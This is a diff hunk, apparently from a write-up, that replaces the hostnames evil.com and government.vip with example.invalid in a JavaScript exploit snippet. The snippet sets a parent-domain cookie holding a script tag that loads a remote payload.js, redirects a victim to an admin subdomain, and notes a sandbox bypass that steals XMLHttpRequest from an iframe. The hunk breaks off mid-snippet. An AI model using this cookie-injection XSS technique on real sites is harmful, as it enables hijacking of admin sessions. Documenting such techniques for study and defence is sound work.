@@ -288,9 +288,9 @@ for i in range(1, 100001):
 
 ```javascript
 // On attacker-accessible subdomain: set cookie for shared parent domain
-document.cookie = 'username=<script src=//evil.com/payload.js></script>; path=/; domain=.government.vip;';
+document.cookie = 'username=<script src=//example.invalid/payload.js></script>; path=/; domain=.example.invalid;';
 // Redirect victim to admin interface on sibling subdomain
-window.top.location = 'http://admin.government.vip:8000';
+window.top.location = 'http://admin.example.invalid:8000';
 
 // In payload.js: bypass sandbox by stealing XMLHttpRequest from iframe
 var iframe = document.createElement('iframe');
